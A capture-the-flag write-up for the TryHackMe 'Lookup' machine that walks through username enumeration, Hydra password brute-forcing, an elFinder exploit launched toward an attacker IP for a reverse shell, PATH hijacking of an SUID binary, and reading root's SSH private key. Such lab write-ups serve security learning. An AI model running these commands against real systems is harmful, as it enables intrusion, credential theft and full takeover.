# Lookup (TryHackMe)

# Overview

**Lookup** is a Linux-based Capture The Flag (CTF) machine that focuses on **Web Enumeration, Username Enumeration, Password Attacks, Virtual Host Discovery, File Manager Exploitation, PATH Hijacking, SUID Abuse, and Privilege Escalation.**

This machine is an excellent example of how several seemingly small weaknesses can be chained together into a complete system compromise. Instead of relying on a single critical vulnerability, the attack combines enumeration, credential attacks, exploitation of a vulnerable web application, Linux privilege escalation techniques, and misuse of SSH keys.

Throughout this machine we practice:

- Web Enumeration
- Virtual Host Discovery
- Username Enumeration
- Password Brute Forcing
- Hydra
- Burp Suite
- elFinder Exploitation
- Reverse Shell
- TTY Upgrade
- PATH Hijacking
- SUID Exploitation
- GTFOBins
- SSH Private Key Abuse

---

# Skills Covered

- Nmap Enumeration
- Hostname Resolution
- Virtual Host Discovery
- Login Enumeration
- Hydra Password Attacks
- Burp Suite Analysis
- Exploit Research
- Reverse Shell
- TTY Stabilization
- Linux Enumeration
- PATH Hijacking
- SUID Abuse
- SSH Key Abuse
- Privilege Escalation

---

# Initial Enumeration

## Nmap Scan

As always, we begin by identifying the exposed services.

![](../Images/Pasted%20image%2020260731160640.png)

The scan revealed:

```
22/tcp   SSH
80/tcp   HTTP
```

The web server looked like the most promising attack surface, so we decided to start there.

---

# Hostname Resolution

Opening the website immediately redirected us to:

```
lookup.thm
```

![](../Images/Pasted%20image%2020260731160756.png)

Since our machine could not resolve this hostname, we added it to our local hosts file.

```
sudo nano /etc/hosts
```

![](../Images/Pasted%20image%2020260731160932.png)

After updating the hosts file, the website became accessible.

---

# Login Enumeration

Browsing the application revealed a login page.

![](../Images/Pasted%20image%2020260731161201.png)

Instead of immediately attempting a brute-force attack, we first tested whether the application leaked information about valid usernames.

Using the username:

```
admin
```

and an invalid password, the application responded with:

```
Wrong password
```

![](../Images/Pasted%20image%2020260731161310.png)

This subtle difference told us something very important:

> The username **admin exists.**

This is a classic **Username Enumeration** vulnerability.

---

# Understanding the Login Request

Before using Hydra, we needed to understand how the login form worked.

We intercepted the authentication request using Burp Suite.

![](../Images/Pasted%20image%2020260731161619.png)

From the request we identified:

- Login endpoint
- Username parameter
- Password parameter

The final piece was the failure message.

Submitting invalid credentials returned:

```
Wrong password. Please try again.
```

---

# Password Brute Force

With everything prepared, we launched Hydra against the admin account.

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=admin&password=^PASS^:Wrong password. Please try again."
```

Unfortunately...

The attack continued for a long time without success.

![](../Images/Pasted%20image%2020260731162028.png)

Time for a new strategy.

---

# Discovering Another User

Instead of attacking passwords, we decided to enumerate usernames.

If another user existed, perhaps it had a weaker password.

Hydra supports username enumeration by supplying a wordlist of possible usernames.

![](../Images/Pasted%20image%2020260731162706.png)

We first captured the application's response for invalid usernames.

![](../Images/Pasted%20image%2020260731163604.png)

Then launched Hydra.

```
hydra -L /usr/share/metasploit-framework/data/wordlists/users.txt \
-p admin \
lookup.thm \
http-post-form "/login.php:username=^USER^&password=admin:Wrong username or password. Please try again." -I
```

Success!

Hydra discovered another valid user.

![](../Images/Pasted%20image%2020260731165045.png)

---

# Password Recovery

Now that we had a different username, we repeated the password brute-force attack.

This time Hydra quickly recovered valid credentials.

![](../Images/Pasted%20image%2020260731165535.png)

---

# Virtual Host Discovery

After logging in, the application redirected us to:

```
files.lookup.thm
```

Instead of loading the page, our browser displayed an error.

![](../Images/Pasted%20image%2020260731165807.png)

Another hostname!

We added it to the hosts file.

![](../Images/Pasted%20image%2020260731165950.png)

The application now loaded correctly.

---

# Exploit Research

The interface revealed that the application was running:

```
elFinder
```

Rather than manually testing for vulnerabilities, we visited our old friend:

**Google.**

Searching for:

```
elFinder exploit
```

quickly revealed a public exploit.

![](../Images/Pasted%20image%2020260731172150.png)

We downloaded it from GitHub.

![](../Images/Pasted%20image%2020260731172238.png)

After reading the exploit documentation...

![](../Images/Pasted%20image%2020260731172350.png)

...we were ready.

---

# Remote Code Execution

Before executing the exploit, we started a Netcat listener.

![](../Images/Pasted%20image%2020260731172456.png)

Then launched the exploit.

```
python3 exploit.py \
-t http://files.lookup.thm/elFinder/ \
-lh <ATTACKER-IP> \
-lp 5555
```

![](../Images/Pasted%20image%2020260731173917.png)

Seconds later...

A Reverse Shell connected back.

![](../Images/Pasted%20image%2020260731173954.png)

---

# Stabilizing the Shell

Interactive shells are much easier to work with.

We upgraded it using Python.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![](../Images/Pasted%20image%2020260731174526.png)

---

# Searching for Privilege Escalation

Now came the fun part.

We searched for SUID binaries.

```
find / -type f -perm /4000 2>/dev/null
```

![](../Images/Pasted%20image%2020260731211249.png)

One binary immediately caught our attention.

Running it produced:

![](../Images/Pasted%20image%2020260731212117.png)

Interestingly, the program:

- executed the `id` command
- attempted to read

```
/home/think/.passwords
```

This suggested a classic **PATH Hijacking** opportunity.

---

# Exploiting PATH Hijacking

Instead of allowing the program to execute the real `id` binary, we created our own fake version.

```
touch /tmp/id
```

```
echo '#!/bin/bash' > /tmp/id
```

```
echo "echo 'uid=33(think) gid=33(think) groups=33(think)'" >> /tmp/id
```

```
chmod 777 /tmp/id
```

Finally, we placed our malicious binary at the beginning of PATH.

```
export PATH=/tmp:$PATH
```

![](../Images/Pasted%20image%2020260731212529.png)

Running the vulnerable binary again caused it to execute **our fake id program** instead of the legitimate one.

The application believed we were the **think** user and disclosed the protected password file.

![](../Images/Pasted%20image%2020260731212615.png)

---

# Recovering User Credentials

The password file contained multiple candidate passwords.

Instead of manually testing each one, we automated the process with Hydra against SSH.

![](../Images/Pasted%20image%2020260731212835.png)

One password successfully authenticated.

---

# SSH Access

Using the recovered credentials, we logged in as **think**.

![](../Images/Pasted%20image%2020260731212913.png)

---

# Privilege Escalation

Running:

```
sudo -l
```

revealed an interesting binary executable as root.

![](../Images/Pasted%20image%2020260731212958.png)

Whenever Linux privilege escalation feels impossible...

...it's time to visit our trusted friend:

**GTFOBins.**

Searching for the binary revealed that it could be abused to read arbitrary files.

![](../Images/Pasted%20image%2020260731213120.png)

Instead of reading random files, we went directly for the prize:

```
/root/.ssh/id_rsa
```

The binary happily revealed the root user's private SSH key.

![](../Images/Pasted%20image%2020260731213334.png)

---

# Root Access

We copied the private key to our attacking machine.

After correcting its permissions:

![](../Images/Pasted%20image%2020260731213423.png)

We authenticated directly as root via SSH.

![](../Images/Pasted%20image%2020260731213508.png)

Mission accomplished.

---

# Summary

This machine demonstrates how effective enumeration can be when combined with careful observation and Linux privilege escalation techniques.

Rather than relying on a single vulnerability, the attack chain combines:

- Login Enumeration
- Password Attacks
- Virtual Host Discovery
- Public Exploit Research
- Remote Code Execution
- PATH Hijacking
- SUID Abuse
- SSH Key Theft
- Root Compromise

One of the biggest lessons from this challenge is that **small weaknesses become powerful when chained together**. A tiny information leak during login, a vulnerable file manager, an improperly written SUID binary, and an overly permissive sudo configuration were enough to achieve complete system compromise.

# Machine Compromised Successfully ✔